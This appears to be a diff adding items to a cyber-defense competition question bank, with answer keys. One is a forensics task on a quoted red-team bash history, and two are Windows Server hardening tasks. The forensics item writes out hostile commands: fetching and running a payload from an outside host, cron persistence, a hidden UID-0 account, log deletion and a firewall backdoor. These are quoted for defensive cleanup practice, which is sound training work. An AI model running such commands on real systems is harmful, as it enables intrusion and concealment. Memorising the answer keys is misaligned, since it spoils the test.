+	{
+		id: "ncae-cf-2",
+		topic: "ncae-ctf-forensics",
+		subtopic: "attack-reconstruction",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"After the red team compromised a server, you need to figure out what they did. The bash history shows:\n\nwget http://10.0.99.5/payload.sh -O /tmp/.hidden.sh\nchmod +x /tmp/.hidden.sh\n/tmp/.hidden.sh\necho '* * * * * root /tmp/.hidden.sh' >> /etc/crontab\nuseradd -o -u 0 -g 0 -M -d /root -s /bin/bash maint\necho 'maint:password123' | chpasswd\nrm -f /var/log/auth.log\niptables -A INPUT -s 10.0.99.5 -j ACCEPT\n\nList everything the attacker did, explain the purpose of each command, and provide the exact commands to undo each action.",
+		correctAnswer:
+			"(1) Downloaded a payload from their server — undo: rm /tmp/.hidden.sh. (2) Made it executable and ran it — undo: check what it did (cat /tmp/.hidden.sh), kill any spawned processes. (3) Added a cron job to run the payload every minute — undo: remove the line from /etc/crontab. (4) Created a hidden root account 'maint' with UID 0 — undo: userdel -r maint. (5) Set a weak password on it — already handled by deleting the account. (6) Deleted auth.log to cover tracks — undo: touch /var/log/auth.log && systemctl restart rsyslog. (7) Allowed all traffic from their IP through the firewall — undo: iptables -D INPUT -s 10.0.99.5 -j ACCEPT.",
+		solutionSteps: [
+			"Command 1 — wget: downloaded a malicious script to a hidden file (/tmp/.hidden.sh) — undo: rm /tmp/.hidden.sh",
+			"Command 2 — chmod +x: made the payload executable — moot after deletion, but check what it spawned",
+			"Command 3 — executed the payload: examine the script first (cat /tmp/.hidden.sh) before deleting to understand what it does",
+			"Check for processes spawned by the payload: ps aux | grep -v grep | grep 'hidden\\|payload\\|10.0.99.5'",
+			"Command 4 — cron persistence: runs the payload every minute — undo: edit /etc/crontab and remove the line",
+			"Verify: crontab -l and check /etc/cron.d/ for additional persistence",
+			"Command 5 — useradd -o -u 0: created user 'maint' with UID 0 (root), -o allows duplicate UID — undo: userdel -rf maint",
+			"Command 6 — chpasswd: set a known weak password — already handled by deleting the account",
+			"Command 7 — rm auth.log: destroyed evidence — undo: touch /var/log/auth.log && chmod 640 /var/log/auth.log && systemctl restart rsyslog",
+			"Command 8 — iptables ACCEPT: created a firewall rule to allow all traffic from their IP — undo: iptables -D INPUT -s 10.0.99.5 -j ACCEPT",
+			"After cleanup: verify with awk -F: '$3 == 0' /etc/passwd (only root), crontab -l (no malicious entries), iptables -L -n (no rogue rules)",
+		],
+		commonMisconceptions: [
+			"Deleting the payload without reading it first — you need to know what it does to find all its effects",
+			"Forgetting the cron job — even if you kill the process and delete the file, the cron will re-download and re-execute it",
+			"Not recognizing -o -u 0 as a UID 0 (root) account — the -o flag allows duplicate UIDs, which is how hidden root accounts work",
+			"Just recreating auth.log without restarting rsyslog — the logging daemon needs to be told about the new file",
+			"Using iptables -F to remove the ACCEPT rule — this flushes ALL rules including your own defense rules; use -D to delete the specific rule",
+		],
+		prerequisites: ["bash-commands", "cron-fundamentals", "user-management", "iptables"],
+		difficulty: "stretch",
+	},
+
+	// ── Windows System Hardening ──
+	{
+		id: "ncae-wh-1",
+		topic: "ncae-windows-hardening",
+		subtopic: "firewall-services",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"You're hardening a Windows Server running IIS. Running 'netstat -an' shows these listening ports:\n\nTCP 0.0.0.0:80   LISTENING  (IIS)\nTCP 0.0.0.0:135  LISTENING  (RPC)\nTCP 0.0.0.0:445  LISTENING  (SMB)\nTCP 0.0.0.0:3389 LISTENING  (RDP)\nTCP 0.0.0.0:5985 LISTENING  (WinRM)\n\nOnly HTTP (port 80) is a scored service. Which services should you restrict or disable, and what commands would you use?",
+		correctAnswer:
+			"Keep port 80 (IIS) open. Restrict or disable: (1) RDP (3389) — restrict to team subnet only: netsh advfirewall firewall add rule name='RDP-Team' dir=in action=allow protocol=tcp localport=3389 remoteip=10.0.1.0/24 & block others. (2) SMB (445) — disable if not needed: Set-Service -Name LanmanServer -StartupType Disabled; Stop-Service LanmanServer. (3) WinRM (5985) — same as RDP, restrict to team subnet. (4) RPC (135) — difficult to disable (many Windows services depend on it), restrict via firewall instead.",
+		solutionSteps: [
+			"Port 80 (IIS) — this is scored, leave it open and accessible from everywhere",
+			"Port 3389 (RDP) — you need this for remote access, but restrict to your team's subnet only",
+			"Firewall command: netsh advfirewall firewall add rule name=\"Block-RDP\" dir=in action=block protocol=tcp localport=3389",
+			"Then allow from team: netsh advfirewall firewall add rule name=\"Allow-RDP-Team\" dir=in action=allow protocol=tcp localport=3389 remoteip=10.0.1.0/24",
+			"Port 445 (SMB) — major attack vector (EternalBlue, etc.); disable if file sharing isn't needed",
+			"PowerShell: Set-Service -Name LanmanServer -StartupType Disabled; Stop-Service -Name LanmanServer -Force",
+			"Port 5985 (WinRM) — remote management; restrict to team subnet like RDP, or disable: Stop-Service WinRM; Set-Service WinRM -StartupType Disabled",
+			"Port 135 (RPC) — many Windows services depend on this; don't disable it, but restrict via firewall rules",
+			"Verify: netstat -an | findstr LISTENING to confirm only expected ports are open",
+			"Make sure Windows Firewall is enabled: Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
+		],
+		commonMisconceptions: [
+			"Disabling RDP entirely — you'll lock yourself out of the server if you don't have physical/console access",
+			"Trying to disable RPC completely — too many Windows services depend on it; restrict via firewall instead",
+			"Leaving SMB open because 'it's a Windows thing' — SMB is one of the most exploited services (EternalBlue/WannaCry)",
+			"Not enabling the Windows Firewall first — rules don't matter if the firewall profile is disabled",
+			"Blocking port 80 by accident — always verify your rules don't block the scored service",
+		],
+		prerequisites: ["windows-basics", "netstat", "windows-firewall", "windows-services"],
+		difficulty: "foundational",
+	},
+	{
+		id: "ncae-wh-2",
+		topic: "ncae-windows-hardening",
+		subtopic: "account-policy",
+		educationLevel: "competition",
+		gradeLevel: 0,
+		question:
+			"Your Windows competition server has these security issues:\n1. The local Administrator password is 'Password1'\n2. Guest account is enabled\n3. No account lockout policy\n4. Password policy allows minimum 1-character passwords\n5. Windows Firewall is turned off\n\nUsing PowerShell commands, fix all five issues. Be specific.",
+		correctAnswer:
+			"(1) net user Administrator N3wStr0ngP@ss2024! (2) net user Guest /active:no (3) net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30 (4) net accounts /minpwlen:12 (5) Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True. These can all be run from an elevated PowerShell prompt.",
+		solutionSteps: [
+			"Issue 1 — weak admin password: net user Administrator 'N3wStr0ngP@ss2024!' (use a complex password with 12+ chars)",
+			"Or in PowerShell: Set-LocalUser -Name Administrator -Password (ConvertTo-SecureString 'N3wStr0ngP@ss2024!' -AsPlainText -Force)",
+			"Issue 2 — Guest account enabled: net user Guest /active:no",
+			"Or: Disable-LocalUser -Name Guest",
+			"Issue 3 — no lockout policy: net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30",
+			"This locks accounts for 30 minutes after 5 failed attempts within a 30-minute window",
+			"Issue 4 — weak password policy: net accounts /minpwlen:12",
+			"Can also enforce complexity: run secpol.msc → Account Policies → Password Policy → Password must meet complexity requirements → Enabled",
+			"Issue 5 — firewall off: Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
+			"Verify all changes: net accounts (shows password and lockout policy), Get-NetFirewallProfile (shows firewall status)",
+		],
+		commonMisconceptions: [
+			"Setting a 'strong' password that's still guessable (like 'Company2024!') — red teams have wordlists for these",
+			"Disabling the Guest account but forgetting other default accounts — check for DefaultAccount and other built-in accounts",
+			"Setting lockout threshold too low (1-2 attempts) — this makes it easy for the red team to lock out YOUR team's accounts via a denial-of-service",
+			"Enabling the firewall without checking existing rules — the firewall might have overly permissive rules that need cleanup",
+			"Only fixing these five issues — there are many more hardening steps (disable unnecessary services, audit policies, remove stored credentials, etc.)",
+		],
+		prerequisites: ["windows-powershell", "net-commands", "security-policy-basics"],
 		difficulty: "on-grade",
 	},
 ];
